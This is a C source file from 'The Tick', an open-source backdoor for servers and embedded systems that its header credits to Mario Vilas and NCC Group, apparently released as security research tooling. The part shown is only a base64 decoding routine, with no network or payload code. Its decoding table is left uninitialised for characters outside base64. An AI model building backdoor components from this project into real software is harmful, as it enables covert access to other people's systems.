/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

// Rudimentary base64 decoding routine.
// Adapted from: https://stackoverflow.com/a/6782480/426293

#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <sys/types.h>

#include "base64.h"

// Decodes a null terminated base64 string into a raw binary array of characters.
// Note that the output is NOT null terminated.
// Arguments are the string, the output buffer, and the output buffer size.
// Returns the number of bytes written, or 0 on error.
static uint8_t encoding_table[64] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
size_t base64_decode(const char *input, uint8_t *output, size_t output_size)
{
    // Get and check the length of the input string.
    size_t input_length = strlen(input);
    if (input_length == 0 || input_length % 4 != 0) return 0;

    // Calculate and check the length of the output.
    size_t output_length = input_length / 4 * 3;
    if (input[input_length - 1] == '=') output_length--;
    if (input[input_length - 2] == '=') output_length--;
    if (output_length == 0 || output_length > output_size) return 0;

    // Build the decoding table in runtime.
    // It would be faster to have it precalculated
    // but this takes up less space in the binary.
    uint8_t decoding_table[256];
    unsigned int i;
    for (i = 0; i < 64; i++) {
        decoding_table[ (uint8_t) encoding_table[i] ] = i;
    }

    // Decode the data.
    unsigned int j;
    for (i = 0, j = 0; i < input_length;) {
        uint32_t sextet_a = input[i] == '=' ? 0 & i++ : decoding_table[ (unsigned int) input[i++] ];
        uint32_t sextet_b = input[i] == '=' ? 0 & i++ : decoding_table[ (unsigned int) input[i++] ];
        uint32_t sextet_c = input[i] == '=' ? 0 & i++ : decoding_table[ (unsigned int) input[i++] ];
        uint32_t sextet_d = input[i] == '=' ? 0 & i++ : decoding_table[ (unsigned int) input[i++] ];
        uint32_t triple = (sextet_a << 3 * 6)
                        + (sextet_b << 2 * 6)
                        + (sextet_c << 1 * 6)
                        + (sextet_d << 0 * 6);
        if (j < output_length) output[j++] = (triple >> 2 * 8) & 0xFF;
        if (j < output_length) output[j++] = (triple >> 1 * 8) & 0xFF;
        if (j < output_length) output[j++] = (triple >> 0 * 8) & 0xFF;
    }

    // Return the length of the output data.
    return output_length;
}
